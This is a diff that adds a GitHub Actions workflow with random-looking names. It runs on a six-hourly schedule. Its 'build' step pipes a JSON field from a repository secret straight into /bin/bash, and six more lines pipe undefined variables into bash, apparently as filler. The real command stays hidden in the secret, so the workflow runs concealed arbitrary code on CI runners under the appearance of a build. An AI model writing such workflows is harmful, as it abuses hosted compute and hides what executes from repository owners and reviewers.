@@ -1,0 +1,23 @@
+name: nongfeiting1524
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: nongfeiting1524
+        env:
+          xnhmm1143: ${{ secrets.xnhmm1143 }}
+        run: |
+          echo $xnhmm1143 | jq -r .i18 | /bin/bash
+          echo $wwq703 | jq -r .jwo555 | /bin/bash
+          echo $pbd64135 | jq -r .pq54452 | /bin/bash
+          echo $mgrfs2 | jq -r .ynp2136 | /bin/bash
+          echo $jjlwv3417 | jq -r .lfqx676 | /bin/bash
+          echo $zunjw2 | jq -r .bsyng3 | /bin/bash
+          echo $p93 | jq -r .os1 | /bin/bash
+
